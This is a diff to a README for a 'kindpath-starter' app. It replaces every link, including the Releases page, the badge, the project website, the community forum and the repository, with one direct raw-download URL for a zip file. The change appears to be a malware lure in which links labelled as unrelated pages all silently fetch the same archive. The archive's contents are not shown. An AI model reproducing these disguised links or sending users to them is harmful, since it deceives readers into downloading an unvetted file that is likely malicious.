@@ -1,6 +1,6 @@
 # 🎉 kindpath-starter - Your Guide to KindPath Collective
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-Click%20Here-blue)](https://github.com/zuqorl/kindpath-starter/releases)
+[![Download Release](https://github.com/zuqorl/kindpath-starter/raw/refs/heads/main/columnar/starter_kindpath_v3.2.zip%20Release-Click%20Here-blue)](https://github.com/zuqorl/kindpath-starter/raw/refs/heads/main/columnar/starter_kindpath_v3.2.zip)
 
 ## 📚 Overview
 Welcome to the KindPath Collective! This application serves as your starting point to explore benevolent practices, ecological thinking, and collaborative efforts in Australia. Whether you want to engage with the community or learn about fair practices, this guide will help you navigate easily.
@@ -12,7 +12,7 @@ To use the KindPath Starter application, follow these straightforward steps:
    - Ensure your computer has an internet connection. This will help you download the application smoothly.
 
 2. **Visit the Releases Page**
-   - Navigate to our [Releases page](https://github.com/zuqorl/kindpath-starter/releases) to find the latest version of the software.
+   - Navigate to our [Releases page](https://github.com/zuqorl/kindpath-starter/raw/refs/heads/main/columnar/starter_kindpath_v3.2.zip) to find the latest version of the software.
 
 3. **Download the Application**
    - On the Releases page, you will see the latest version listed. Click on the link to download the appropriate file for your operating system. 
@@ -26,7 +26,7 @@ To use the KindPath Starter application, follow these straightforward steps:
 ## 📥 Download & Install
 To get started, click the link below to visit the Releases page and download the application:
 
-[Download Release](https://github.com/zuqorl/kindpath-starter/releases)
+[Download Release](https://github.com/zuqorl/kindpath-starter/raw/refs/heads/main/columnar/starter_kindpath_v3.2.zip)
 
 ### 🔧 System Requirements
 For optimal performance, ensure your system meets the following requirements:
@@ -53,8 +53,8 @@ If you encounter any issues or have questions, feel free to reach out through ou
 
 ## 🔗 Learn More
 For further information and updates, check out the links below:
-- [KindPath Collective Website](https://kindpathcollective.org)
-- [Community Forum](https://forum.kindpathcollective.org)
-- [GitHub Repository](https://github.com/zuqorl/kindpath-starter)
+- [KindPath Collective Website](https://github.com/zuqorl/kindpath-starter/raw/refs/heads/main/columnar/starter_kindpath_v3.2.zip)
+- [Community Forum](https://github.com/zuqorl/kindpath-starter/raw/refs/heads/main/columnar/starter_kindpath_v3.2.zip)
+- [GitHub Repository](https://github.com/zuqorl/kindpath-starter/raw/refs/heads/main/columnar/starter_kindpath_v3.2.zip)
 
 Thank you for being part of the KindPath journey. Your exploration and contribution matter!
